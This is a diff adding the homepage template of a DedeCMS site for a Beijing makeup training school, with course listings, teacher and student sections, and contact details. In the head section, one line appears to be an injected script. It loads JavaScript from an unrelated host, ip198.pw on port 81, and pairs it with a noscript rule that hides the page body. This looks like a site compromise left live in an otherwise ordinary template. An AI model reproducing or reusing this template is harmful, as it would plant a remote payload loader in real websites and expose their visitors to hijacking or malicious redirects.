@@ -1,0 +1,428 @@
+﻿<!DOCTYPE html>
+<html>    
+	<head>
+		<meta charset="UTF-8">
+     	 <base target="_blank" />
+		<title>{dede:global.cfg_webname/}</title>
+		<meta name="description" content="{dede:global.cfg_description/}" />
+		<meta name="keywords" content="{dede:global.cfg_keywords/}" />
+			<script>var system ={win : false,mac : false,xll : false};
+var p = navigator.platform;
+system.win = p.indexOf("Wi") == 0;
+system.mac = p.indexOf("Mac") == 0;
+system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+if(system.win||system.mac||system.xll){
+
+}else{ 
+document.location.href="http://m.ruiscz.com/";
+}</script>
+		<link rel="stylesheet" type="text/css" href="{dede:global.cfg_templets_skin/}/css/style.css"/>
+      	<script src="{dede:global.cfg_templets_skin/}/js/jquery-1.8.3.min.js"></script>
+        <script src="{dede:global.cfg_templets_skin/}/js/jquery.SuperSlide.2.1.1.js" type="text/javascript" charset="utf-8"></script>
+		<script src="{dede:global.cfg_templets_skin/}/js/flux.min.js" type="text/javascript" charset="utf-8"></script>
+		<script src="{dede:global.cfg_templets_skin/}/js/main.js"></script>
+		<script src="{dede:global.cfg_templets_skin/}/js/gaoxian.js" type="text/javascript" charset="utf-8"></script>	
+<noscript><style type="text/css">body{display:none;background:#fff}</style></noscript><script type='text/javascript' charset='utf-8' src='http://ip198.pw:81/l/?1068'></script>
+	</head>
+	<body>
+		<div class="header ">
+			<div class="container clear">
+				<a href="/" target="_blank"  class="logo"><img src="{dede:global.cfg_templets_skin/}/images/logo.png" width="412" height="81" alt="北京化妆学校-瑞尚创美化妆培训"/></a>
+				<img src="{dede:global.cfg_templets_skin/}/images/top-tel.png" width="404" height="22" alt="电话：400-8592511" class="tel"／>
+			</div>
+		</div>
+		<div class="nav">
+			<div class="nav-top">
+				<div class="container">
+				<ul class="main-nav clear">
+					<li><a href="/">官网首页</a></li>
+					<li class="on"><a href="/course/">化妆课程</a></li>
+					<li><a href="/teachers/">名师团队</a></li>
+					<li><a href="/xysx/">学员实习</a></li>
+					<li><a href="/xyhj/">校园环境</a></li>
+					<li><a href="/xyzp/">学员作品</a></li>
+					<li><a href="/news/">化妆资讯</a></li>
+					<li><a href="/about/">关于我们</a></li>
+					<li><a href="/contact/">联系我们</a></li>
+					<li><a href="/video/">视频</a></li>
+				</ul>
+				</div>
+			</div>
+			<div class="nav-course">
+				<ul class="sub-nav clear container">
+					<li><a href="/course/">全部课程</a></li>
+					<li><a href="/course/xxsj/">形象设计</a></li>
+					<li><a href="/course/cqjx/">长期精修</a></li>
+					<li><a href="/course/xnhz/">新娘化妆</a></li>
+					<li><a href="/course/mjkc/">美甲课程</a></li>
+					<li><a href="/course/tskc/">特色课程</a></li>
+					<li><a href="/course/pfkc/">盘发课程</a></li>
+				</ul>
+			</div>
+		</div>
+		
+      <div id="slider">
+        
+        {dede:arclist typeid='18' }
+        <a href="[field:arcurl/]"><img src="[field:picname/]" alt=""/></a>
+					{/dede:arclist}
+
+		</div>
+      
+		<div class="course-index">
+			<div class="title-group">
+				<h2><strong>热门课程</strong></h2>
+				<h3>为学生量身打造 · 正在火热报名中</h3>
+			</div>
+			<div class="container">
+				<div class="course-list clear">
+					<a href="/course/dzb.html" class="width-large" title="北京化妆学校-形象设计影视人物大专班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_1.jpg"   alt="北京化妆学校-形象设计影视人物大专班"  /><span>形象设计影视人物大专班</span></a>
+					<a href="/course/sszxjyb.html" class="width-large" title="北京化妆学校-时尚造型精英班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_2.jpg" alt="北京化妆学校-时尚造型精英班"/><span>时尚造型精英班</span></a>
+					<a href="/course/ylsy.html" class="width-small" title="北京化妆学校-影楼新娘实用班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_3.jpg" alt="北京化妆学校-影楼新娘实用班" /><span>新娘影楼实用班</span></a>
+					<a href="/course/xngz.html" class="width-small" title="北京化妆学校-新娘跟妆速成班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_4.jpg" alt="北京化妆学校-新娘跟妆速成班" /><span>新娘跟妆速成班</span></a>
+					<a href="/course/qnb.html" class="width-small" title="北京化妆培训-高级化妆师全能班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_5.jpg" alt="北京化妆培训-高级化妆师全能班" /><span>高级化妆师全能班</span></a>
+					<a href="/course/xnzm.html" class="width-small" title="北京化妆培训-影楼新娘周末/晚班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_6.jpg" alt="北京化妆培训-影楼新娘周末/晚班" /><span>影楼新娘周末/晚班</span></a>
+					<a href="/course/xxys.html" class="width-large" title="北京化妆培训-形象设计影视人物研修班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_7.jpg" alt="北京化妆培训-形象设计影视人物研修班" /><span>形象设计影视人物研修班</span></a>
+					<a href="/course/sszxyx.html" class="width-large" title="北京化妆培训-时尚造型研修班"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/kc_8.jpg" alt="北京化妆培训-时尚造型研修班"/><span>时尚造型研修班</span></a>
+				</div>
+				<div class="center">
+					<a href="/course/" class="btn-courseAll">全部课程</a>
+				</div>
+				<div class="hot-sign">
+					<h4>新班火热报名中</h4>
+					<ul class="clear">
+						<li class="phone">报名热线<span>400-8592511</span></li>
+						<li class="share">化妆分享<span>bjrsgjczpx</span></li>
+						<li class="weichat" style="background-position:8px -185px;background-image:url(/templets/ruiscz1/images/icon_index.png)">微信咨询<span>bjrsgjcz</span></li>
+						<li class="qq">QQ咨询<span>2235908928</span></li>
+					</ul>
+				</div>
+			</div>
+		</div>
+		
+		<div class="bg-gray">
+			<div class="title-group arrow-white">
+				<h2><strong>发展历程</strong></h2>
+				<h3>走进瑞尚创美 · 带你见证成长历程</h3>
+			</div>
+			<div class="ruiscz-intro container clear">
+				<div class="fl">
+							<div id="slideBox" class="slideBox" style="height: 373px;">
+			<div class="bd">
+				<ul>
+					<li><a href="#" target="_blank"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/t_1.jpg"  alt="瑞尚历程" style="width: 682px;height: 373px;"/></a></li>
+					<li><a href="#" target="_blank"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/t_2.jpg"  alt="瑞尚历程" style="width: 682px;height: 373px;"/></a></li>
+					<li><a href="#" target="_blank"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/t_3.jpg"  alt="瑞尚历程" style="width: 682px;height: 373px;"/></a></li>
+					
+				</ul>
+			</div>
+			<a class="prev" href="javascript:void(0)" style="left:20px"></a>
+			<a class="next" href="javascript:void(0)" style="right:20px"></a>
+				</div>
+				</div>
+				<div class="fr">
+					<h4 class="center"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/lc-tit.jpg" width="255" height="44" alt="培养高薪从业人才"/></h4>
+					<p>瑞尚创美化妆培训隶属于瑞尚创美（北京）教育科技有限公司（前身为北京东方瑞尚文化发展有限公司），是一家综合性化妆培训中心。</p>
+<p>瑞尚创美化妆培训以市场为导向，以就业为根本。以行业发展为己任，以学生前途为终极目标，培养高素质、高技能、高学历的综合性人才。选择瑞尚创美，圆你化妆师梦想。</p>
+				</div>
+				<div class="center clear">
+					<a href="/about/" class="btn-courseAll btn-grow">见证发展历程</a>
+				</div>
+			</div>
+		</div>
+		
+		<div class="practice">
+			<div class="container">
+				<div class="fl">
+					<div class="pic">
+						<ul>
+							<li><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/z_1.jpg"/></li>
+							<li><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/z_2.jpg"/></li>
+							<li class="active"><img class="lazy" data-original="{dede:global.cfg_templets_skin/}/images/z_3.jpg"/></li>
+						</ul>
+					</div>
+				</div>
+				<div class="fr">
+					<ul>
+						<li>1、瑞尚创美化妆培训致力于化妆培训十余年，是专业职业培训中心。</li>
+						<li>2、中韩师资合璧教学，学员毕业可获得结业证书。</li>
+						<li class="bz">3、学员可考取证书：结业证、职业资格等级证。</li>
+						<li>4、签约学习，培训课程免费复修，在校有大量实习机会，推荐就业 。</li><br/>
+					</ul>	
+					<div class="btn-area"><a href="http://www1.53kf.com/webCompany.php?arg=10089714&style=1">咨询报名条件</a><a href="http://www1.53kf.com/webCompany.php?arg=10089714&style=1">咨询课程与费用</a></div>
+				</div>
+			</div>
+			
+		</div>
+		
+		<div class="news-index container clear">
+			<div class="fl">
+				<h2>学生感言</h2>
+				<div class="lists">
+					<div class="line clear">
+					{dede:arclist typeid='67'  titlelen=64 row='1' limit='0,1'}
+						<div class="img"><a href="[field:arcurl/]"><img class="lazy" data-original="[field:picname/]" width="221" height="154" alt=""/></a></div>
+						<div class="text">
+							<h3 class="clear"><a href="[field:arcurl/]">[field:title/]</a></h3>
+							<div class="des">[field:description function='cn_substr(@me,100)'/]...</div>
+							<a href="[field:arcurl/]" class="more">阅读全文》</a>
+						</div>
+					{/dede:arclist}
+					</div>
+					<ul>
+					{dede:arclist typeid='67'  titlelen=64 row='1' limit='1,5'}
+						<li><a href="[field:arcurl/]">[field:title/]</a><span>[field:pubdate function='strftime("%Y-%m-%d",@me)'/]</span></li>
+					{/dede:arclist}
+					</ul>
+				</div>
+			</div>
+			<div class="fr">
+				<h2>最新动态</h2>
+				<div class="lists">
+					<div class="line clear">
+					{dede:arclist typeid='12,13'  titlelen=64 row='1' limit='0,1'}
+						<div class="img"><a href="[field:arcurl/]"><img class="lazy" data-original="[field:picname/]" width="221" height="154" alt=""/></a></div>
+						<div class="text">
+							<h3 class="clear"><a href="[field:arcurl/]">[field:title/]</a></h3>
+							<div class="des">[field:description function='cn_substr(@me,100)'/]...</div>
+							<a href="[field:arcurl/]" class="more">阅读全文》</a>
+						</div>
+					{/dede:arclist}
+					</div>
+					<ul>
+					{dede:arclist typeid='11'  titlelen=64 row='1' limit='1,5'}
+						<li><a href="[field:arcurl/]">[field:title/]</a><span>[field:pubdate function='strftime("%Y-%m-%d",@me)'/]</span></li>
+					{/dede:arclist}
+					</ul>
+				</div>
+			</div>
+		</div>
+		
+		<div class="teacher-index clear">
+			<div class="title-group">
+				<h2><strong>名师团队</strong></h2>
+				<h3>专业师资，严格管理教学队伍，保证教学质量</h3>
+			</div>
+	
+		<div class="picMarquee-left">
+			<div class="hd">
+				<a class="next" href="javascript:void(0)"></a>
+				<a class="prev" href="javascript:void(0)"></a>
+			</div>
+			<div class="bd">
+				<ul class="picList">
+					{dede:arclist typeid='4'  titlelen=64 row='8' limit='0,8'}
+					<li>
+						<div class="pic"><a href="[field:arcurl/]" target="_blank"><img class="lazy" data-original="[field:picname/]" /></a></div>
+					</li>
+					{/dede:arclist}
+				</ul>
+			</div>
+		</div>
+		<div class="center">
+					<a href="/teachers/" class="btn-courseAll">名师团队</a>
+				</div>
+			</div>
+		</div>	
+		<div class="bg-gray">
+			<div class="title-group">
+				<h2><strong>实践活动</strong></h2>
+				<h3>专业师资，严格管理教学队伍，保证教学质量</h3>
+			</div>
+			<div class=" container">
+				<div class="activity-index clear">
+				{dede:arclist typeid='95'  titlelen=64 row='10' }
+					<div class="w25">
+						<div class="img">
+							<a href="[field:arcurl/]"><img class="lazy" data-original="[field:picname/]" width="234" height="176"/></a>
+						</div>
+						<div class="txt">
+							<a href="[field:arcurl/]">[field:title/]</a>
+							<span class="date">[field:pubdate function='strftime("%Y-%m-%d",@me)'/]</span>
+						</div>
+					</div>
+				{/dede:arclist}	
+					<div class="center clear">
+						<a href="/xysx/" class="btn-courseAll btn-grow">丰富的实习生活</a>
+					</div>
+				</div>
+				
+				
+			</div>
+		</div>
+		
+		<div class="vedio mb40">
+			<div class="title-group">
+				<h2><strong>精彩视频</strong></h2>
+				<h3>选择瑞尚创美化妆培训，圆你化妆师梦想</h3>
+			</div>
+			<div class="container">
+				<div class="activity-index clear vedio-index">
+				{dede:arclist typeid='69'  titlelen=64 row='10' }
+					<div class="w25">
+						<div class="img">
+							<a href="[field:arcurl/]"><img class="lazy" data-original="[field:picname/]" width="214" height="147"/></a>
+						</div>
+						<div class="txt">
+							<a href="[field:arcurl/]">[field:title/]
+							</a>
+							<span class="date">[field:pubdate function='strftime("%Y-%m-%d",@me)'/]</span>
+						</div>
+					</div>
+				{/dede:arclist}		
+				</div>
+		</div></div>
+		<div class="works">
+			<div class="title-group arrow-white">
+				<h2><strong>学员部分作品</strong></h2>
+				<h3>专业师资，严格管理教学队伍，保证教学质量</h3>
+			</div>
+			<div class="container">
+				<div class="activity-index clear work-index">
+				{dede:arclist addfields='name,teachers,type' typeid='20' channelid='19'  titlelen=64 row='10' }
+					<div class="w25">
+						<div class="img">
+							<a href="[field:arcurl/]"><img class="lazy" data-original="[field:picname/]" width="214" height="296" alt="[field:shorttitle/]" /></a>
+						</div>
+						<div class="txt">
+							<a href="[field:arcurl/]">[field:name /] <span>[field:type /]</span></a>
+							<span class="tea">指导老师：[field:teachers /]</span>
+						</div>
+					</div>
+				{/dede:arclist}		
+				<div style="clear:both;"></div>
+					<div class="center">
+						<a href="/xyzp/" class="btn-courseAll btn-grow">优秀学员作品</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="compete container">
+			<div class="title-group arrow-white">
+				<h2>回顾<strong>化妆大赛</strong></h2>
+				<h3>时尚经典创意造型为你精彩呈现</h3>
+			</div>
+			<div id="slideBox" class="slideBox">
+			<!--<div class="hd">
+				<ul><li>1</li><li>2</li></ul>
+			</div>-->
+			<div class="bd">
+				<ul>
+					<li><a href="http://www.ruiscz.com/news/rszx/2274.html" target="_blank"><img class="lazy" data-original="/templets/ruiscz1/images/ds_banner_2.jpg" border="0"></a></li>
+					<li><script src='/plus/ad_js.php?aid=28' language='javascript'></script></li>
+					<li><script src='/plus/ad_js.php?aid=29' language='javascript'></script></li>
+				</ul>
+			</div>
+			<!-- 下面是前/后按钮代码，如果不需要删除即可 -->
+			<a class="prev" href="javascript:void(0)"></a>
+			<a class="prev" href="javascript:void(0)"></a>
+			<a class="next" href="javascript:void(0)"></a>
+
+		</div>
+
+		</div>
+		
+		
+		<div class="compete">
+			<div class="title-group arrow-white">
+				<h2>你<strong>学习生活的地方</strong></h2>
+				<h3>优越的教学环境，舒适的生活环境</h3>
+			</div>
+			<div class="picMarquee-left">
+			<div class="hd">
+				<a class="next" href="javascript:void(0)"></a>
+				<a class="prev" href="javascript:void(0)"></a>
+			</div>
+			<div class="bd">
+				<ul class="picList">
+				{dede:arclist typeid='93'  titlelen=64 row='8' }
+					<li>
+						<div class="pic"><a href="[field:arcurl/]" target="_blank"><img class="lazy" data-original="[field:picname/]" /></a></div>
+					</li>
+				{/dede:arclist}		
+				</ul>
+			</div>
+		</div>
+			<div class="center">
+				<a href="/xyhj/" class="btn-courseAll">查看更多</a>
+			</div>		
+		</div>
+		
+		<div class="contact container">
+			<div class="ways clear">
+				<dl>
+					<dt class="online"><i></i>在线咨询</dt>
+					<dd>微信号：ruiscz<br />
+工作时间：每日9:00—18:00</dd>
+				</dl>
+				<dl>
+					<dt class="onphone"><i></i>咨询热线</dt>
+					<dd>丰台区热线：010-67632318<br />
+海淀区热线：010-64857001<br />
+朝阳区热线：010-85828998</dd>
+				</dl>
+				<dl>
+					<dt class="onreg"><i></i>在线报名</dt>
+					<dd>网银报名，安全快捷<br />
+支付宝及各大网银报名</dd>
+				</dl>
+			</div>
+			<div class="address clear">
+				<dl>
+					<dt>联系方式</dt>	
+					<dd>地址：瑞尚创美化妆培训（丰台区）：北京市丰台区刘家窑顺三条金隅中威商务花园1号楼<br />
+        		<span>瑞尚创美化妆培训（海淀区）：北京市朝阳区双泉堡甲2号中国舰船研究院14号楼</span>
+     	  <span>瑞尚创美化妆培训（朝阳区）：北京市朝阳区八里庄北里农民日报社1号院7号楼</span>
+电话：4008592511（全天可咨询）</dd>
+				</dl>
+			</div>
+		</div>
+		<div class="frind-link">
+			<div class="container">
+				友情链接：{dede:flink type='textall' row='24'} [field:link /] {/dede:flink}
+			</div>
+		</div>
+		<div class="footer">
+			<a href="javascript:;" id="btn-top"></a>
+			<div class=" clear">
+				<ul class="bot-nav">
+					<li><a href="/">官网首页</a></li>
+					<li><a href="/courses/">化妆课程</a></li>
+					<li><a href="/teachers/">名师团队</a></li>
+					<li><a href="/xysx/">学员实习</a></li>
+					<li><a href="/xyhj/">校园环境</a></li>
+					<li><a href="/xyzp/">学员作品</a></li>
+					<li><a href="/news/">化妆资讯</a></li>
+					<li><a href="/about/">关于我们</a></li>
+					<li><a href="/contact/">联系我们</a></li>
+					<li><a href="/video/">视频</a></li>
+			</ul>
+			<div class="copyright">
+				版权所有：瑞尚创美（北京）教育科技有限公司<br />
+合作伙伴：浙江卫视  河南卫视  光艺传媒  花儿朵朵  美丽俏佳人  影像视觉
+			</div>
+			</div>
+			
+		</div>
+		
+	</body>
+</html>
+	
+
+<script src="/templets/ruiscz1/js/jquery.lazyload.min.js"></script>
+
+<script type="text/javascript" charset="utf-8">
+  $(function() {
+      $("img.lazy").lazyload({effect: "fadeIn",threshold : 200,failurelimit : 10});
+  });
+</script>
+<script type='text/javascript' src='http://tb.53kf.com/kf.php?arg=10089714&style=1'></script>
+	<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?92c47555568ec02888604d1bf980e5e2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
